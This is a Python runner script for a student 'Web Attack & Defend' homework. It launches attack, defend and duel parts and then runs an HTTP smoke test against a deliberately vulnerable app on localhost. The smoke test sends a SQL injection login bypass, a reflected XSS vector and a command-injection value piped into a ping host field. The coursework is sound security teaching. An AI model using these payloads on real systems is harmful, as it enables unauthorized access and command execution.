# HW2 — Web Attack & Defend — reproduce everything — Team: Gabriel Avalos, Keoma Quiroga, David Bucheli
"""Run Parts A, B, C end-to-end and a REAL HTTP smoke test of the live app.

    python run_all.py

Regenerates every result CSV/JSON. Exit 0 iff every part meets its success
condition (3/3 classes with >=3 oracle-confirmed bypasses; >=3 working WAF bypasses
+ the fix defeats all payloads + a legit login still works; the HTTP smoke test
confirms one payload per class over the wire). Laptop-only, 127.0.0.1, synthetic
data only. See ../../resources/ethics-and-scope.md.
"""
from __future__ import annotations

import json
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from common import paths as _paths   # noqa: E402
_paths.bootstrap()
import vulnweb_app as app            # noqa: E402

PY = sys.executable
SCRIPTS = [("PART A — attack", HERE / "attack" / "attack.py"),
           ("PART B — defend", HERE / "defend" / "defend.py"),
           ("PART C — duel",   HERE / "duel" / "duel.py")]


def run(label: str, script: Path) -> int:
    print("\n" + "=" * 72 + f"\n{label}\n" + "=" * 72)
    return subprocess.run([PY, str(script)]).returncode


def http_smoke() -> int:
    """Attack the REAL running app over HTTP with one confirmed payload per class —
    evidence the findings hold end-to-end, not only in-process."""
    print("\n" + "=" * 72 + "\nHTTP smoke test — attacking the live app over the wire\n" + "=" * 72)
    app.DB = app.make_db()
    port = 8973
    srv = ThreadingHTTPServer(("127.0.0.1", port), app.Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    time.sleep(0.2)
    base = f"http://127.0.0.1:{port}"
    try:
        req = urllib.request.Request(base + "/login",
            data=json.dumps({"user": "admin' OR '1'='1", "pw": "x"}).encode(),
            headers={"Content-Type": "application/json"})
        sqli = app.CANARY_SECRET in urllib.request.urlopen(req, timeout=5).read().decode()
        print(f"  [{'OK ' if sqli else 'FAIL'}] SQLi  canary leaked over HTTP")
        body = urllib.request.urlopen(
            base + "/?name=" + urllib.parse.quote("<svg onload=alert(1)>"), timeout=5).read().decode()
        xss = "<svg onload=" in body and "&lt;" not in body
        print(f"  [{'OK ' if xss else 'FAIL'}] XSS   unescaped vector reflected over HTTP")
        req = urllib.request.Request(base + "/ping",
            data=json.dumps({"host": "127.0.0.1 | whoami"}).encode(),
            headers={"Content-Type": "application/json"})
        cmdi = json.loads(urllib.request.urlopen(req, timeout=5).read().decode()).get("injection_detected") is True
        print(f"  [{'OK ' if cmdi else 'FAIL'}] cmdi  shell metachar reached command over HTTP")
        ok = sqli and xss and cmdi
    finally:
        srv.shutdown()
    return 0 if ok else 1


def main() -> int:
    codes = {label: run(label, s) for label, s in SCRIPTS}
    codes["HTTP smoke"] = http_smoke()
    print("\n" + "=" * 72 + "\nSUMMARY\n" + "=" * 72)
    for k, v in codes.items():
        print(f"  [{'PASS' if v == 0 else 'FAIL'}] {k}")
    return 0 if all(v == 0 for v in codes.values()) else 1


if __name__ == "__main__":
    raise SystemExit(main())
